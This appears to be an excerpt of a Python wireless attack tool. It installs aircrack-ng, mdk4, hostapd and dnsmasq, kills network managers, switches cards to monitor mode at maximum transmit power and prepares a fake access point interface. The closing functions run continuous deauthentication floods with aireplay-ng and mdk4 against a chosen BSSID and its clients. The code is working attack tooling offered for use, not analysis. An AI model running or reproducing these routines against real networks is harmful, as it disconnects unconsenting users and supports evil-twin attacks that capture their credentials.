...
def run(cmd, timeout: int=30, check: bool=False, quiet: bool=True) -> subprocess.CompletedProcess:
    kwargs = {'timeout': timeout, 'text': True}
    if quiet:
...
def detect_terminal() -> Optional[str]:
    for name in ('xterm', 'x-terminal-emulator', 'gnome-terminal', 'xfce4-terminal', 'mate-terminal', 'konsole', 'tilix', 'lxterminal', 'kitty', 'alacritty', 'ptyxis', 'kgx', 'qterminal'):
        p = which(name)
        if p:
            return p
    return None

def open_side_terminal(title: str, command: str, log=print, geometry: str='100x32-20+40') -> Optional[subprocess.Popen]:
    ...
    inner = command
    if base == 'xterm':
        cmd = [term, '-geometry', geometry, '-T', title, '-bg', 'black', '-fg', 'green', '-fa', 'Monospace', '-fs', '10', '-e', 'bash', '-lc', inner]
    elif base in ('gnome-terminal', 'kgx'):
        g = geometry.split('-')[0].split('+')[0]
        cmd = [term, f'--geometry={g}', f'--title={title}', '--', 'bash', '-lc', inner]
    elif base == 'xfce4-terminal':
        cmd = [term, f'--geometry={geometry}', f'--title={title}', '-e', f'bash -lc {shlex_quote(inner)}']
    elif base == 'mate-terminal':
        g = geometry.split('-')[0].split('+')[0]
        cmd = [term, f'--geometry={g}', f'--title={title}', '-e', f'bash -lc {shlex_quote(inner)}']
    elif base == 'konsole':
    ...
    try:
        ...
        if proc.poll() is not None:
            if base == 'x-terminal-emulator':
                proc = subprocess.Popen([term, '-e', 'bash', '-lc', inner], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(0.3)
            if proc.poll() is not None:
...
def ensure_dependencies(log=print) -> bool:
    apt_pkgs = []
    tools = {'airmon-ng': 'aircrack-ng', 'aireplay-ng': 'aircrack-ng', 'airodump-ng': 'aircrack-ng', 'airbase-ng': 'aircrack-ng', 'hostapd': 'hostapd', 'dnsmasq': 'dnsmasq', 'iw': 'iw', 'iptables': 'iptables', 'mdk4': 'mdk4'}
    ...
    try:
        ...
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'rich'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception:
    ...
    try:
        ...
        r = run(['apt-get', 'install', '-y'] + apt_pkgs, timeout=600, quiet=False)
        if r.returncode != 0:
...
def list_wifi_ifaces(include_mon: bool=True) -> List[str]:
    ...
    if code == 0 and out:
        for m in re.finditer('Interface\\s+(\\S+)', out):
            n = m.group(1)
            if 'p2p' in n.lower():
                continue
            if n not in found:
    ...
    for n in list_net_ifaces():
        ...
        if 'p2p' in n.lower() or n in ('lo', 'at0'):
            continue
        if re.match('^(wl|wlan|wlp)', n) or n.endswith('mon') or n.startswith('mon'):
            if os.path.exists(f'/sys/class/net/{n}/wireless') or os.path.exists(f'/sys/class/net/{n}/phy80211'):
                found.append(n)
            elif re.match('^(wl|wlan)', n) or n.endswith('mon'):
                found.append(n)
    if not include_mon:
        found = [x for x in found if not x.endswith('mon') and (not (x.startswith('mon') and x[3:].isdigit())) and (iface_type(x) != 'monitor')]
    return found
...
_INTERFERERS = ('NetworkManager', 'wpa_supplicant', 'wpa_cli', 'dhclient', 'dhcpcd', 'avahi-daemon', 'iwd', 'hostapd', 'dnsmasq', 'dhcpd', 'airbase-ng', 'aireplay-ng', 'airodump-ng', 'mdk4', 'wpa_action', 'ifplugd')
...
def airgeddon_check_kill(log: Callable=print, iface: Optional[str]=None) -> None:
    ...
    for svc in ('NetworkManager', 'NetworkManager-wait-online', 'wpa_supplicant', 'iwd'):
    ...
    if which('airmon-ng'):
        ...
        text = (out or '') + '\n' + (err or '')
        for m in re.finditer('\\b(\\d{2,7})\\b', text):
            try:
                pid = int(m.group(1))
            except ValueError:
                continue
            ...
            try:
                ...
                continue
            low = comm.lower()
            if any((x in low for x in ('network', 'wpa', 'dhcp', 'avahi', 'iwd', 'hostapd', 'dnsmasq', 'airodump', 'aireplay', 'airbase', 'mdk4', 'wifi'))):
                try:
...
def _find_monitor_iface(preferred_base: Optional[str]=None) -> Optional[str]:
    ...
    for n in list_wifi_ifaces(include_mon=True):
        typ = iface_type(n)
        if typ == 'monitor' or n.endswith('mon') or (n.startswith('mon') and n[3:].isdigit()):
            cands.append(n)
    if preferred_base:
        prefer = [preferred_base + 'mon', preferred_base, 'wlan0mon', 'mon0']
        for p in prefer:
            if p in cands:
                return p
...
def airmon_start(iface: str, log: Callable=print) -> Optional[str]:
    ...
    if which('airmon-ng'):
        ...
        text = (out or '') + '\n' + (err or '')
        m = re.search('(?:monitor mode (?:vif )?enabled on\\s+(\\S+)|\\(monitor mode enabled\\)\\s*on\\s+(\\S+)|mac80211 monitor mode vif enabled[^\\n]*on\\s+\\[?(\\S+)\\]?)', text, re.I)
        if m:
...
def recreate_station(name: Optional[str]=None, phy: Optional[str]=None, log=print) -> Optional[str]:
    ...
    for cand in candidates:
        ...
        r = run(['iw', 'phy', phy, 'interface', 'add', cand, 'type', 'managed'], quiet=False)
        time.sleep(0.3)
        if iface_exists(cand):
            run(['nmcli', 'device', 'set', cand, 'managed', 'no'])
            run(['ip', 'link', 'set', cand, 'up'])
...
def ensure_ap_iface(preferred: Optional[str]=None, mon: Optional[str]=None, log=print) -> Optional[str]:
    names = []
    if preferred:
...
def to_managed(iface: str) -> Optional[str]:
    if not iface_exists(iface):
        return None
    if iface.endswith('mon') or iface.startswith('mon') or iface_type(iface) == 'monitor':
...
def add_monitor_vif(phy: str, channel: int=6, log=print) -> Optional[str]:
    ...
    if iface_exists(mon):
        ...
        run(['iw', 'dev', mon, 'del'])
    r = run(['iw', 'phy', phy, 'interface', 'add', mon, 'type', 'monitor'], quiet=False)
    if r.returncode != 0:
        mon = 'monet0'
        if iface_exists(mon):
            run(['iw', 'dev', mon, 'del'])
...
def supports_ap(iface: str) -> bool:
    ...
    if code != 0:
        return True
    if re.search('Supported interface modes:[\\s\\S]*?\\*\\s*AP\\b', out):
        return True
...
def supports_monitor(iface: str) -> bool:
    ...
    if code != 0:
        return True
    return bool(re.search('\\*\\s*monitor\\b', out, re.I))

def set_txpower_max(iface: str, log=print) -> None:
    if not iface_exists(iface):
        return
    for dbm in (30, 27, 25, 22, 20):
        r = run(['iw', 'dev', iface, 'set', 'txpower', 'fixed', str(dbm * 100)], quiet=False)
        if r.returncode == 0:
...
def split_ap_deauth_ifaces(preferred: Optional[str]=None) -> Tuple[Optional[str], Optional[str]]:
    stations = []
    for n in list_wifi_ifaces(include_mon=True):
        if 'p2p' in n.lower():
            continue
...
def aggressive_deauth_burst(mon: str, bssid: str, seconds: int=15, client_macs: Optional[List[str]]=None, log=print) -> None:
    ...
    while time.time() < end:
        run(['aireplay-ng', '-0', '15', '-a', bssid, '--ignore-negative-one', mon], timeout=20)
        for mac in clients[:8]:
            run(['aireplay-ng', '-0', '8', '-a', bssid, '-c', mac, '--ignore-negative-one', mon], timeout=15)
        if use_mdk4:
            try:
                subprocess.run(['mdk4', mon, 'd', '-B', bssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=4)
            except Exception:
                pass
        time.sleep(0.5)

def start_continuous_deauth(mon: str, bssid: str, stop_event: threading.Event, client_macs_fn=None, log=print) -> threading.Thread:
    use_mdk4 = which('mdk4') is not None

    def loop():
        log(f'[+] Davomiy uzish boshlandi @ {mon}')
        while not stop_event.is_set():
            run(['aireplay-ng', '-0', '12', '-a', bssid, '--ignore-negative-one', mon], timeout=18)
            clients = []
            ...
            for mac in clients[:6]:
                if stop_event.is_set():
                    break
                run(['aireplay-ng', '-0', '6', '-a', bssid, '-c', mac, '--ignore-negative-one', mon], timeout=12)
            if use_mdk4 and (not stop_event.is_set()):
                try:
                    subprocess.run(['mdk4', mon, 'd', '-B', bssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
                except Exception:
                    pass
            stop_event.wait(1.2)
